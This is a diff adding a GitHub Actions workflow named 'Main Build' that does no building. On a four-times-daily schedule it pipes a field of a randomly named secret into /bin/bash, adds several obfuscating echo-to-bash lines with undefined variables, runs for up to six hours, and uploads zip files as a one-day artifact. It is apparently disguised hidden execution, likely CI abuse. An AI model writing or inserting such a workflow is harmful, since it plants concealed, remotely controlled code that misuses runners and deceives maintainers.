@@ -1,0 +1,34 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          r9836: ${{ secrets.r9836 }}
+        run: |
+          printf '%s' "$r9836" | jq -r .mql61 | /bin/bash
+          echo $cwxy1452 | jq -r .bwa7781 | /bin/bash
+          echo $wt14 | jq -r .la7744 | /bin/bash
+          printf '%s' "$ebo6" | jq -r .e97670 | /bin/bash
+          echo $jxil13317 | jq -r .xgoh84 | /bin/bash
+          printf '%s' "$csv59675" | jq -r .ahf345 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: FHr0yD6I
+          path: "*.zip"
+          retention-days: 1
